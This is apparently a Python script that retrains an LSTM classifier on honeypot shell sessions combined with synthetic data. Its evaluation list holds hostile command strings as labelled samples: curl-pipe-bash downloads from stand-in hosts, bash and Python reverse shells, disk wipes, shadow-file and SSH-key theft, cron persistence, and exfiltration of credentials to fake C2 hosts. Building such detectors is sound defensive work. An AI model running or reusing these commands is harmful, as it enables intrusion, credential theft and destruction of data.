"""
Retrain Neural Model v6 with Diverse Synthetic Data

This script addresses the critical issue where the model predicts "Safe" or "Recon"
with 100% confidence for actual APT attacks because:
1. Training data had 99.5% of Destructive class as ONE attack pattern
2. Classes 1 (Recon) and 3 (Exploit) had 0 real sessions
3. APT vs Destructive was differentiated by binary features, not commands

Solution:
1. Generate diverse synthetic data for ALL 6 classes (2000 per class)
2. Deduplicate the SSH key attack in real data (keep only 100 samples)
3. Combine synthetic + deduplicated real data
4. Train with balanced class weights
5. Evaluate on diverse hand-crafted test cases

Usage:
    .venv\Scripts\python src\training\neural\retrain_v6.py
"""

import sys
import os
from pathlib import Path

# Add src to path
sys.path.insert(0, str(Path(__file__).parent.parent.parent))

import random
import numpy as np
import pandas as pd
import torch
import torch.nn as nn
from torch.utils.data import DataLoader
from sklearn.model_selection import train_test_split
from sklearn.metrics import classification_report, confusion_matrix
from collections import Counter
import pickle
import json
from datetime import datetime

from training.neural.synthetic_v2 import SyntheticGeneratorV2
from training.neural.model import ThreatClassifier
from training.neural.dataset import CommandTokenizer, ThreatDataset, collate_fn
from training.neural.losses import CombinedLoss


# =============================================================================
# Configuration
# =============================================================================

class Config:
    # Paths
    PROJECT_ROOT = Path(__file__).parent.parent.parent.parent
    REAL_DATA_PATH = PROJECT_ROOT / "data/exports/sessions_semantic_labeled.csv"
    SYNTHETIC_OUTPUT = PROJECT_ROOT / "data/exports/synthetic_v2.csv"
    MODEL_OUTPUT = PROJECT_ROOT / "models/brain_v6_diverse.pkl"
    RESULTS_OUTPUT = PROJECT_ROOT / "models/brain_v6_diverse_results.json"
    CHECKPOINT_DIR = PROJECT_ROOT / "checkpoints"
    
    # Synthetic data
    SYNTHETIC_PER_CLASS = 2000
    RANDOM_SEED = 42
    
    # Real data deduplication
    MAX_DUPLICATE_PATTERN = 100  # Max samples of the same command pattern
    
    # Training
    EPOCHS = 30
    BATCH_SIZE = 64
    LEARNING_RATE = 1e-3
    WEIGHT_DECAY = 1e-4
    EARLY_STOPPING_PATIENCE = 7
    
    # Model architecture
    VOCAB_SIZE = 256
    EMBED_DIM = 64
    LSTM_HIDDEN = 128
    LSTM_LAYERS = 2
    STRUCTURED_DIM = 100
    NUM_CLASSES = 6
    
    # Device
    DEVICE = 'cuda' if torch.cuda.is_available() else 'cpu'


CLASS_NAMES = ['Safe', 'Recon', 'Downloader', 'Exploit', 'Destructive', 'ADVANCED_APT']


# =============================================================================
# Data Loading and Preprocessing
# =============================================================================

def load_real_data(config: Config) -> pd.DataFrame:
    """Load real data and deduplicate dominant patterns."""
    print(f"Loading real data from {config.REAL_DATA_PATH}...")
    df = pd.read_csv(config.REAL_DATA_PATH)
    print(f"  Total sessions: {len(df)}")
    
    # Check label distribution
    print("\n  Original label distribution:")
    for label_id in range(6):
        count = len(df[df['combined_label_id'] == label_id])
        name = CLASS_NAMES[label_id]
        print(f"    {label_id} {name}: {count}")
    
    return df


def deduplicate_patterns(df: pd.DataFrame, max_per_pattern: int = 100) -> pd.DataFrame:
    """
    Deduplicate sessions with identical command patterns.
    
    The SSH key replacement attack appears 35,000+ times with nearly identical commands.
    This causes the model to overfit to this single pattern.
    """
    print(f"\nDeduplicating patterns (max {max_per_pattern} per pattern)...")
    
    # Normalize commands for comparison (strip whitespace, lowercase)
    df = df.copy()
    df['cmd_normalized'] = df['commands'].str.lower().str.strip()
    
    # Group by normalized command and sample
    deduplicated = []
    for cmd_pattern, group in df.groupby('cmd_normalized'):
        if len(group) > max_per_pattern:
            sampled = group.sample(n=max_per_pattern, random_state=42)
            deduplicated.append(sampled)
        else:
            deduplicated.append(group)
    
    result = pd.concat(deduplicated, ignore_index=True)
    result = result.drop(columns=['cmd_normalized'])
    
    print(f"  Before: {len(df)}, After: {len(result)}")
    print("\n  Deduplicated label distribution:")
    for label_id in range(6):
        count = len(result[result['combined_label_id'] == label_id])
        name = CLASS_NAMES[label_id]
        print(f"    {label_id} {name}: {count}")
    
    return result


def generate_synthetic_data(config: Config) -> pd.DataFrame:
    """Generate diverse synthetic data for all classes."""
    print(f"\nGenerating {config.SYNTHETIC_PER_CLASS} synthetic sessions per class...")
    
    generator = SyntheticGeneratorV2(seed=config.RANDOM_SEED)
    df = generator.generate_balanced(n_per_class=config.SYNTHETIC_PER_CLASS)
    
    # Save for inspection
    config.SYNTHETIC_OUTPUT.parent.mkdir(parents=True, exist_ok=True)
    df.to_csv(config.SYNTHETIC_OUTPUT, index=False)
    print(f"  Saved to {config.SYNTHETIC_OUTPUT}")
    
    return df


def combine_datasets(real_df: pd.DataFrame, synth_df: pd.DataFrame) -> pd.DataFrame:
    """Combine real and synthetic data with consistent column naming."""
    print("\nCombining real and synthetic data...")
    
    # Use combined_label_id/name as the label source for real data
    real_df = real_df.copy()
    if 'combined_label_id' in real_df.columns:
        # Drop original label_id/label_name if they exist, use combined versions
        real_df = real_df.drop(columns=['label_id', 'label_name'], errors='ignore')
        real_df = real_df.rename(columns={
            'combined_label_id': 'label_id',
            'combined_label_name': 'label_name'
        })
    
    # Get columns that exist in both dataframes
    common_cols = list(set(synth_df.columns) & set(real_df.columns))
    
    # Ensure essential columns are included
    essential = ['session_id', 'commands', 'label_id', 'label_name']
    for col in essential:
        if col not in common_cols and col in synth_df.columns and col in real_df.columns:
            common_cols.append(col)
    
    real_subset = real_df[common_cols].copy()
    synth_subset = synth_df[common_cols].copy()
    
    # Mark source
    real_subset['is_synthetic'] = False
    synth_subset['is_synthetic'] = True
    
    combined = pd.concat([real_subset, synth_subset], ignore_index=True)
    combined = combined.sample(frac=1, random_state=42).reset_index(drop=True)  # Shuffle
    
    print(f"  Combined: {len(combined)} sessions")
    print(f"    Real: {len(real_subset)}, Synthetic: {len(synth_subset)}")
    
    print("\n  Final label distribution:")
    for label_id in range(6):
        count = len(combined[combined['label_id'] == label_id])
        name = CLASS_NAMES[label_id]
        print(f"    {label_id} {name}: {count}")
    
    return combined


# =============================================================================
# Feature Extraction
# =============================================================================

def get_structured_feature_columns():
    """Get the 100 structured feature column names."""
    mitre_cols = [
        'mitre_tactic_reconnaissance', 'mitre_tactic_resource_development',
        'mitre_tactic_initial_access', 'mitre_tactic_execution',
        'mitre_tactic_persistence', 'mitre_tactic_privilege_escalation',
        'mitre_tactic_defense_evasion', 'mitre_tactic_credential_access',
        'mitre_tactic_discovery', 'mitre_tactic_lateral_movement',
        'mitre_tactic_collection', 'mitre_tactic_command_and_control',
        'mitre_tactic_exfiltration', 'mitre_tactic_impact',
        'mitre_severity_max', 'mitre_severity_mean', 'mitre_severity_weighted',
        'mitre_kill_chain_score', 'mitre_unique_technique_count',
        'mitre_total_commands', 'mitre_matched_commands'
    ]
    
    binary_cols = [
        'triage_file_size', 'triage_entropy', 'triage_priority',
        'triage_is_go', 'triage_is_packed', 'triage_is_stripped',
        'triage_is_dll', 'triage_is_static', 'triage_score_mining',
        'triage_score_botnet', 'triage_score_recon', 'triage_score_destructive',
        'ghidra_function_count', 'ghidra_total_instructions', 'ghidra_total_basic_blocks',
        'ghidra_max_function_size', 'ghidra_avg_callers', 'ghidra_max_callers',
        'ghidra_mining_pool_count', 'ghidra_crypto_wallet_count', 'ghidra_ip_count',
        'ghidra_url_count', 'ghidra_shell_cmd_count', 'ghidra_file_path_count',
        'ghidra_imports_file_io', 'ghidra_imports_process', 'ghidra_imports_network',
        'ghidra_imports_crypto', 'ghidra_imports_evasion', 'ghidra_has_aes_sbox',
        'ghidra_has_sha256_constants', 'ghidra_has_rc4_state', 'ghidra_has_xor_loop',
        'ghidra_go_user_functions', 'ghidra_go_runtime_functions',
        'angr_basic_blocks', 'angr_edges', 'angr_functions_recovered',
        'angr_cyclomatic_complexity', 'angr_function_count', 'angr_user_functions_listed',
        'angr_syscalls_network', 'angr_syscalls_file_io', 'angr_syscalls_process',
        'angr_syscalls_memory', 'angr_ip_count', 'angr_url_count',
        'angr_mining_indicator_count', 'angr_shell_cmd_count', 'angr_has_network',
        'angr_has_file_manipulation', 'angr_has_process_control', 'angr_has_crypto',
        'angr_has_mining', 'angr_has_persistence', 'angr_has_evasion',
        'angr_has_shell_execution', 'angr_complexity_tier', 'angr_is_partial',
        'angr_loaded_as_blob',
        'script_line_count', 'script_url_count', 'script_download_count',
        'script_arch_count', 'script_is_downloader', 'script_is_multi_arch',
        'script_is_miner', 'script_has_persistence', 'script_has_anti_forensics',
        'has_ghidra_results', 'has_angr_results', 'has_script_results',
        'deep_func_ratio_angr_ghidra', 'deep_mining_signal_count',
        'deep_total_network_indicators', 'deep_total_crypto_indicators',
        'deep_max_complexity', 'deep_total_evasion_indicators', 'deep_is_go_consensus'
    ]
    
    return mitre_cols + binary_cols


def extract_features(df: pd.DataFrame):
    """Extract commands, structured features, and labels."""
    commands = df['commands'].fillna('').tolist()
    labels = df['label_id'].astype(int).tolist()
    
    # Extract structured features
    feature_cols = get_structured_feature_columns()
    available_cols = [c for c in feature_cols if c in df.columns]
    
    # Fill missing columns with zeros
    for col in feature_cols:
        if col not in df.columns:
            df[col] = 0.0
    
    structured = df[feature_cols].fillna(0.0).values.astype(np.float32)
    
    return commands, structured, labels


# =============================================================================
# Test Cases for Evaluation
# =============================================================================

DIVERSE_TEST_CASES = [
    # Safe
    {"commands": "ls -la; pwd; whoami", "label": 0, "name": "Safe: basic commands"},
    {"commands": "uname -a; hostname; date", "label": 0, "name": "Safe: system info"},
    {"commands": "cat README.md; head -10 file.txt", "label": 0, "name": "Safe: file reading"},
    
    # Recon
    {"commands": "nmap -sS -p 22,80,443 192.168.1.1", "label": 1, "name": "Recon: nmap scan"},
    {"commands": "netstat -tulpn; ss -antp; arp -a", "label": 1, "name": "Recon: network enum"},
    {"commands": "cat /etc/passwd; find / -perm -4000 2>/dev/null", "label": 1, "name": "Recon: user/suid enum"},
    {"commands": "ps aux; top -bn1; who; w; last", "label": 1, "name": "Recon: process/user enum"},
    
    # Downloader
    {"commands": "wget http://evil.com/bot.sh; chmod +x bot.sh; ./bot.sh", "label": 2, "name": "Downloader: wget exec"},
    {"commands": "curl -sL http://c2.attacker.net/payload | bash", "label": 2, "name": "Downloader: curl pipe bash"},
    {"commands": "cd /tmp; wget http://192.168.1.100/xmrig; chmod 777 xmrig; ./xmrig", "label": 2, "name": "Downloader: miner"},
    
    # Exploit
    {"commands": "cat /etc/shadow; unshadow /etc/passwd /etc/shadow > hashes.txt", "label": 3, "name": "Exploit: credential theft"},
    {"commands": "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1", "label": 3, "name": "Exploit: reverse shell"},
    {"commands": "cat ~/.ssh/id_rsa; cat ~/.bash_history | grep -i password", "label": 3, "name": "Exploit: key/history theft"},
    {"commands": "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"evil.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", "label": 3, "name": "Exploit: python revshell"},
    
    # Destructive
    {"commands": "rm -rf /; rm -rf /*", "label": 4, "name": "Destructive: rm -rf /"},
    {"commands": "dd if=/dev/zero of=/dev/sda bs=1M", "label": 4, "name": "Destructive: disk wipe"},
    {"commands": "rm -rf /var/log/*; history -c; cat /dev/null > ~/.bash_history", "label": 4, "name": "Destructive: log/history wipe"},
    {"commands": "shred -u /etc/passwd /etc/shadow; rm -rf /home/*", "label": 4, "name": "Destructive: shred files"},
    {"commands": "cd ~; rm -rf .ssh; mkdir .ssh; echo 'ssh-rsa AAAA...' >> .ssh/authorized_keys", "label": 4, "name": "Destructive: SSH backdoor"},
    
    # APT
    {"commands": "uname -a; id; wget http://c2.evil.com/implant -O /tmp/.sys; chmod +x /tmp/.sys; /tmp/.sys &; echo '* * * * * /tmp/.sys' >> /var/spool/cron/root; cat /etc/shadow > /tmp/.c; curl -X POST http://c2.evil.com/exfil -d @/tmp/.c; rm /tmp/.c; history -c", "label": 5, "name": "APT: full kill chain"},
    {"commands": "hostname; curl -s http://c2/backdoor -o /tmp/.bd; chmod +x /tmp/.bd; nohup /tmp/.bd &; cp /tmp/.bd /usr/bin/.sysupdate; echo '/usr/bin/.sysupdate &' >> ~/.bashrc; cat /etc/shadow | base64 | curl -X POST http://c2/data -d @-", "label": 5, "name": "APT: persistence + exfil"},
    {"commands": "ps aux; netstat -antp; wget http://evil.com/kit.tar.gz -O /tmp/k.tgz; tar xzf /tmp/k.tgz -C /opt; echo '0 */6 * * * /opt/kit/beacon' >> /etc/crontab; sqlite3 ~/.config/google-chrome/Default/Login\\ Data 'SELECT * FROM logins' > /tmp/.b; nc evil.com 443 < /tmp/.b; rm -rf /tmp/k.tgz /tmp/.b", "label": 5, "name": "APT: toolkit + browser creds"},
]


def evaluate_on_test_cases(model, tokenizer, device, config):
    """Evaluate model on diverse hand-crafted test cases."""
    print("\n" + "=" * 80)
    print("EVALUATION ON DIVERSE TEST CASES")
    print("=" * 80)
    
    model.eval()
    correct = 0
    results = []
    
    for tc in DIVERSE_TEST_CASES:
        # Tokenize
        encoded, lengths = tokenizer.encode_batch([tc['commands']])
        encoded = encoded.to(device)
        lengths = lengths.to(device)
        
        # Zero structured features (test command-only inference)
        structured = torch.zeros(1, config.STRUCTURED_DIM, dtype=torch.float32).to(device)
        
        # Predict
        with torch.no_grad():
            preds, probs = model.predict(encoded, structured, lengths)
        
        pred_label = preds[0].item()
        confidence = probs[0][pred_label].item()
        expected = tc['label']
        
        is_correct = pred_label == expected
        if is_correct:
            correct += 1
        
        status = "OK" if is_correct else "FAIL"
        print(f"\n[{status}] {tc['name']}")
        print(f"  Expected: {CLASS_NAMES[expected]}, Got: {CLASS_NAMES[pred_label]} ({confidence*100:.1f}%)")
        if not is_correct:
            print(f"  Commands: {tc['commands'][:80]}...")
        
        results.append({
            'name': tc['name'],
            'expected': CLASS_NAMES[expected],
            'predicted': CLASS_NAMES[pred_label],
            'confidence': confidence,
            'correct': is_correct
        })
    
    accuracy = correct / len(DIVERSE_TEST_CASES) * 100
    print(f"\n{'=' * 80}")
    print(f"Test Case Accuracy: {correct}/{len(DIVERSE_TEST_CASES)} ({accuracy:.1f}%)")
    print("=" * 80)
    
    return results, accuracy


# =============================================================================
# Training
# =============================================================================

def train_epoch(model, train_loader, criterion, optimizer, device, scaler):
    """Train for one epoch with mixed precision."""
    model.train()
    total_loss = 0
    correct = 0
    total = 0
    
    for batch in train_loader:
        commands = batch['commands'].to(device)
        structured = batch['structured'].to(device)
        lengths = batch['lengths'].to(device)
        labels = batch['labels'].to(device)
        
        optimizer.zero_grad()
        
        with torch.cuda.amp.autocast(enabled=(device == 'cuda')):
            logits = model(commands, structured, lengths)
            loss = criterion(logits, labels)
        
        scaler.scale(loss).backward()
        scaler.unscale_(optimizer)
        torch.nn.utils.clip_grad_norm_(model.parameters(), max_norm=1.0)
        scaler.step(optimizer)
        scaler.update()
        
        total_loss += loss.item()
        preds = logits.argmax(dim=1)
        correct += (preds == labels).sum().item()
        total += labels.size(0)
    
    return total_loss / len(train_loader), correct / total


def evaluate(model, val_loader, criterion, device):
    """Evaluate on validation set."""
    model.eval()
    total_loss = 0
    all_preds = []
    all_labels = []
    
    with torch.no_grad():
        for batch in val_loader:
            commands = batch['commands'].to(device)
            structured = batch['structured'].to(device)
            lengths = batch['lengths'].to(device)
            labels = batch['labels'].to(device)
            
            logits = model(commands, structured, lengths)
            loss = criterion(logits, labels)
            
            total_loss += loss.item()
            preds = logits.argmax(dim=1)
            all_preds.extend(preds.cpu().numpy())
            all_labels.extend(labels.cpu().numpy())
    
    return total_loss / len(val_loader), all_preds, all_labels


def train_model(config: Config, train_df: pd.DataFrame, val_df: pd.DataFrame):
    """Full training loop."""
    print("\n" + "=" * 80)
    print("TRAINING")
    print("=" * 80)
    
    # Extract features
    print("\nPreparing datasets...")
    
    # Create tokenizer
    tokenizer = CommandTokenizer(max_length=512)
    
    # Create datasets - ThreatDataset takes DataFrame + tokenizer
    train_dataset = ThreatDataset(train_df, tokenizer)
    val_dataset = ThreatDataset(val_df, tokenizer)
    
    train_loader = DataLoader(train_dataset, batch_size=config.BATCH_SIZE, shuffle=True, num_workers=0, collate_fn=collate_fn)
    val_loader = DataLoader(val_dataset, batch_size=config.BATCH_SIZE, shuffle=False, num_workers=0, collate_fn=collate_fn)
    
    # Create model
    model = ThreatClassifier(
        vocab_size=config.VOCAB_SIZE,
        embed_dim=config.EMBED_DIM,
        lstm_hidden=config.LSTM_HIDDEN,
        lstm_layers=config.LSTM_LAYERS,
        structured_dim=config.STRUCTURED_DIM,
        num_classes=config.NUM_CLASSES
    ).to(config.DEVICE)
    
    print(f"\nModel parameters: {sum(p.numel() for p in model.parameters()):,}")
    print(f"Device: {config.DEVICE}")
    
    # Get labels for class weighting
    train_labels = train_df['label_id'].astype(int).tolist()
    
    # Compute class costs (higher for rare/dangerous classes)
    label_counts = Counter(train_labels)
    total = sum(label_counts.values())
    
    # Cost multipliers: higher cost for missing APT/Destructive
    class_costs = {
        0: 1.0,   # Safe
        1: 2.0,   # Recon
        2: 3.0,   # Downloader
        3: 3.0,   # Exploit
        4: 4.0,   # Destructive - higher cost
        5: 5.0,   # APT - highest cost
    }
    print(f"Class costs: {class_costs}")
    
    # Loss, optimizer, scheduler
    criterion = CombinedLoss(gamma=2.0, class_costs=class_costs, num_classes=config.NUM_CLASSES).to(config.DEVICE)
    optimizer = torch.optim.AdamW(model.parameters(), lr=config.LEARNING_RATE, weight_decay=config.WEIGHT_DECAY)
    scheduler = torch.optim.lr_scheduler.ReduceLROnPlateau(optimizer, mode='min', factor=0.5, patience=3)
    scaler = torch.cuda.amp.GradScaler(enabled=(config.DEVICE == 'cuda'))
    
    # Training loop
    best_val_loss = float('inf')
    patience_counter = 0
    history = {'train_loss': [], 'val_loss': [], 'train_acc': [], 'val_acc': []}
    
    config.CHECKPOINT_DIR.mkdir(parents=True, exist_ok=True)
    
    for epoch in range(config.EPOCHS):
        train_loss, train_acc = train_epoch(model, train_loader, criterion, optimizer, config.DEVICE, scaler)
        val_loss, val_preds, val_labels_list = evaluate(model, val_loader, criterion, config.DEVICE)
        
        val_acc = sum(p == l for p, l in zip(val_preds, val_labels_list)) / len(val_labels_list)
        
        history['train_loss'].append(train_loss)
        history['val_loss'].append(val_loss)
        history['train_acc'].append(train_acc)
        history['val_acc'].append(val_acc)
        
        scheduler.step(val_loss)
        
        print(f"Epoch {epoch+1}/{config.EPOCHS}: train_loss={train_loss:.4f}, val_loss={val_loss:.4f}, train_acc={train_acc:.4f}, val_acc={val_acc:.4f}")
        
        # Early stopping
        if val_loss < best_val_loss:
            best_val_loss = val_loss
            patience_counter = 0
            torch.save(model.state_dict(), config.CHECKPOINT_DIR / "best_model_v6.pt")
        else:
            patience_counter += 1
            if patience_counter >= config.EARLY_STOPPING_PATIENCE:
                print(f"Early stopping at epoch {epoch+1}")
                break
    
    # Load best model
    model.load_state_dict(torch.load(config.CHECKPOINT_DIR / "best_model_v6.pt"))
    
    # Final evaluation
    _, val_preds, val_labels_list = evaluate(model, val_loader, criterion, config.DEVICE)
    
    print("\n" + "=" * 80)
    print("VALIDATION SET CLASSIFICATION REPORT")
    print("=" * 80)
    print(classification_report(val_labels_list, val_preds, target_names=CLASS_NAMES, digits=4))
    
    print("\nConfusion Matrix:")
    cm = confusion_matrix(val_labels_list, val_preds)
    print(cm)
    
    return model, tokenizer, history


def save_model(model, tokenizer, config: Config, history: dict, test_results: list, test_accuracy: float):
    """Save model bundle and results."""
    print("\nSaving model...")
    
    # Save bundle
    bundle = {
        'model': model.cpu(),
        'tokenizer': tokenizer,
        'config': {
            'vocab_size': config.VOCAB_SIZE,
            'embed_dim': config.EMBED_DIM,
            'lstm_hidden': config.LSTM_HIDDEN,
            'lstm_layers': config.LSTM_LAYERS,
            'structured_dim': config.STRUCTURED_DIM,
            'num_classes': config.NUM_CLASSES,
        },
        'class_names': CLASS_NAMES,
        'created': datetime.now().isoformat(),
    }
    
    config.MODEL_OUTPUT.parent.mkdir(parents=True, exist_ok=True)
    with open(config.MODEL_OUTPUT, 'wb') as f:
        pickle.dump(bundle, f)
    print(f"  Model saved to {config.MODEL_OUTPUT}")
    
    # Save results
    results = {
        'training_history': history,
        'test_case_results': test_results,
        'test_case_accuracy': test_accuracy,
        'created': datetime.now().isoformat(),
    }
    
    with open(config.RESULTS_OUTPUT, 'w') as f:
        json.dump(results, f, indent=2)
    print(f"  Results saved to {config.RESULTS_OUTPUT}")


# =============================================================================
# Main
# =============================================================================

def main():
    print("=" * 80)
    print("  RETRAIN NEURAL MODEL v6 WITH DIVERSE SYNTHETIC DATA")
    print("=" * 80)
    
    config = Config()
    
    # Set seeds
    random.seed(config.RANDOM_SEED)
    np.random.seed(config.RANDOM_SEED)
    torch.manual_seed(config.RANDOM_SEED)
    if torch.cuda.is_available():
        torch.cuda.manual_seed_all(config.RANDOM_SEED)
    
    # Load and prepare data
    real_df = load_real_data(config)
    real_df_dedup = deduplicate_patterns(real_df, max_per_pattern=config.MAX_DUPLICATE_PATTERN)
    
    synth_df = generate_synthetic_data(config)
    combined_df = combine_datasets(real_df_dedup, synth_df)
    
    # Split
    train_df, val_df = train_test_split(combined_df, test_size=0.15, random_state=config.RANDOM_SEED, stratify=combined_df['label_id'])
    print(f"\nTrain: {len(train_df)}, Val: {len(val_df)}")
    
    # Train
    model, tokenizer, history = train_model(config, train_df, val_df)
    
    # Evaluate on diverse test cases
    model = model.to(config.DEVICE)
    test_results, test_accuracy = evaluate_on_test_cases(model, tokenizer, config.DEVICE, config)
    
    # Save
    save_model(model, tokenizer, config, history, test_results, test_accuracy)
    
    print("\n" + "=" * 80)
    print("  TRAINING COMPLETE")
    print("=" * 80)
    print(f"\n  Model: {config.MODEL_OUTPUT}")
    print(f"  Test Case Accuracy: {test_accuracy:.1f}%")


if __name__ == '__main__':
    main()
